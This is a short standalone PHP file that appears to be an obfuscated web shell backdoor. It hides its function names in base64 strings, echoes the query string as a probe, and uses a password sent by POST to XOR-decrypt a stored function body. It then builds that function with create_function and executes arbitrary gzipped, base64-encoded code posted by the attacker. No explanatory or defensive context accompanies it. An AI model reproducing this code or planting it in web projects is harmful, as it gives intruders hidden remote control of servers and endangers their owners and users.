<?php

class c5f72057b0bb7f
{
    private $r5f72057b0bbff = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r5f72057b0bbff[$name], $args);
    }

    public function d5f72057b0bc9a($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p5f72057b0bbc2()
    {
        $qString = $this->d5f72057b0bc9a("TVByM09BPT06OlFVRVJZX1NUUklORw==");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d5f72057b0bc9a("OTNDTHIxVGV2STBXS2p0VDdFRT06OmU=");
        $p = $this->d5f72057b0bc9a("MmxaaWJrSWVrQT09Ojpw");

        if (!isset($_POST[$e]) ||
            !isset($_POST[$p])) {
            return;
        }

        $methodName = 'em5f72057b0bcda';
        $methodContent = 'UBBWXhhTQgxTPQNUQWoHRVVDHR45AD9NCg==';

        $base64decode = $this->d5f72057b0bc9a("T01YYTh0TmI1U3hDOjpiYXNlNjRfZGVjb2Rl");
        $createFunction = $this->d5f72057b0bc9a("UHNpcWdWSkZONXZ6OjpjcmVhdGVfZnVuY3Rpb24=");
        $gzinflate = $this->d5f72057b0bc9a("QnJ6ZERlRT06Omd6aW5mbGF0ZQ==");
        $regex = $this->d5f72057b0bc9a("bStYMS9uRWg3bkt5VnRaUkl3PT06Oi9eWyAtfl0rJC8=");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r5f72057b0bbff[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c5f72057b0bb7f)->p5f72057b0bbc2();
